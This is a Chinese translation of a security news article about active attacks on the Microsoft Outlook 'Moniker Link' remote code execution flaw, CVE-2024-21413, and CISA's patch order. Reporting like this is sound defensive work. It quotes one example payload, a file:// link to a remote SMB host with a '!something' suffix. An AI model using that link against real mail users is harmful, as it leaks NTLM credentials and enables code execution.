---
title: Microsoft Outlook中的严重RCE错误现已被攻击利用
url: https://www.anquanke.com/post/id/303925
source: 安全客-有思想的安全新媒体
date: 2025-02-08
fetch_date: 2025-10-06T20:33:49.928482
---

# Microsoft Outlook中的严重RCE错误现已被攻击利用

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# Microsoft Outlook中的严重RCE错误现已被攻击利用

阅读量**276111**

发布时间 : 2025-02-07 10:52:09

**x**

##### 译文声明

本文是翻译文章，文章原作者 Sergiu Gatlan，文章来源：bleepingcomputer

原文地址：<https://www.bleepingcomputer.com/news/security/critical-rce-bug-in-microsoft-outlook-now-exploited-in-attacks/>

译文仅供参考，具体内容表达以及含义原文为准。

![Outlook]()

周四，美国网络安全与基础设施安全局（CISA）警告美国联邦机构，要保护其系统，抵御针对微软 Outlook 关键远程代码执行（RCE）漏洞正在发起的攻击。

该漏洞由 Check Point 漏洞研究员李海飞发现，编号为 CVE – 2024 – 21413。其成因是在使用存在漏洞的 Outlook 版本打开包含恶意链接的电子邮件时，输入验证不当。

攻击者之所以能获得远程代码执行能力，是因为该漏洞使他们能够绕过受保护视图（受保护视图本应通过以只读模式打开 Office 文件来阻止嵌入其中的有害内容），并以编辑模式打开恶意 Office 文件。

一年前，微软在修复 CVE – 2024 – 21413 漏洞时也曾警告，预览窗格是一个攻击途径，即便在预览恶意构造的 Office 文档时，也可能导致攻击得逞。

正如 Check Point 所解释的，这个名为 “Moniker Link” 的安全漏洞，使得威胁行为者能够绕过 Outlook 对嵌入在电子邮件中的恶意链接的内置保护机制。他们利用 file:// 协议，并在指向攻击者控制服务器的 URL 后添加感叹号来实现这一点。

感叹号紧跟在文件扩展名之后添加，同时还会加上随机文本（Check Point 在示例中使用了 “something”），如下所示：

```
*<a href="file:///\\10.10.111.111\test\test.rtf!something">CLICK ME</a>*
```

CVE – 2024 – 21413 影响多种 Office 产品，包括 Microsoft Office LTSC 2021、Microsoft 365 企业版应用、Microsoft Outlook 2016 以及 Microsoft Office 2019。成功利用 CVE – 2024 – 21413 漏洞发起的攻击，可能导致 NTLM 凭证被盗取，以及通过恶意构造的 Office 文档执行任意代码。

周四，CISA 将该漏洞添加到其已知被利用漏洞（KEV）目录中，并标记为正在被积极利用。根据《约束性操作指令（BOD）22 – 01》的要求，联邦机构必须在三周内，即 2 月 27 日前，保障其网络安全。

“这类漏洞是恶意网络行为者常用的攻击途径，给联邦企业带来重大风险，” 该网络安全机构警告称。

虽然 CISA 主要专注于提醒联邦机构尽快修复漏洞，但也建议私营企业优先修复这些漏洞，以抵御正在进行的攻击。

本文翻译自bleepingcomputer [原文链接](https://www.bleepingcomputer.com/news/security/critical-rce-bug-in-microsoft-outlook-now-exploited-in-attacks/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/303925](/post/id/303925)

安全KER - 有思想的安全新媒体

本文转载自: [bleepingcomputer](https://www.bleepingcomputer.com/news/security/critical-rce-bug-in-microsoft-outlook-now-exploited-in-attacks/)

如若转载,请注明出处： <https://www.bleepingcomputer.com/news/security/critical-rce-bug-in-microsoft-outlook-now-exploited-in-attacks/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)

**+1**3赞

收藏

![](https://p4.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p0.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p4.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=170061)

[安全客](/member.html?memberId=170061)

这个人太懒了，签名都懒得写一个

* 文章
* **2096**

* 粉丝
* **6**

### TA的文章

* ##### [英国通过数据访问和使用监管法案](/post/id/308719)

  2025-06-20 17:11:10
* ##### [CISA警告：严重缺陷（CVE-2025-5310）暴露加油站设备](/post/id/308715)

  2025-06-20 17:09:03
* ##### [大多数公司高估了AI治理，因为隐私风险激增](/post/id/308708)

  2025-06-20 17:05:02
* ##### [研究人员发现了有史以来最大的数据泄露事件，暴露了160亿个登录凭证](/post/id/308704)

  2025-06-20 17:02:15
* ##### [CVE-2025-6018和CVE-2025-6019漏洞利用：链接本地特权升级缺陷让攻击者获得大多数Linux发行版的根访问权限](/post/id/308701)

  2025-06-20 16:59:36

### 相关文章

* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28
* ##### [DarkCloud信息窃取器现新变种：采用VB6混淆技术并新增加密货币钱包窃取功能，威胁显著升级](/post/id/312435)

  2025-09-29 18:02:53
* ##### [TamperedChef恶意软件兴起：欺诈应用利用经过签名的二进制文件与搜索引擎投毒劫持浏览器](/post/id/312432)

  2025-09-29 18:02:25
* ##### [黑客将SVG文件武器化，用于隐秘投递恶意负载](/post/id/312351)

  2025-09-24 16:44:10
* ##### [ShadowV2僵尸网络利用配置错误的AWS Docker容器构建DDoS攻击租用服务](/post/id/312381)

  2025-09-24 16:40:43
* ##### [npm软件包“fezbox”中被发现新型恶意软件，可利用二维码窃取用户凭据](/post/id/312387)

  2025-09-24 16:40:06

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)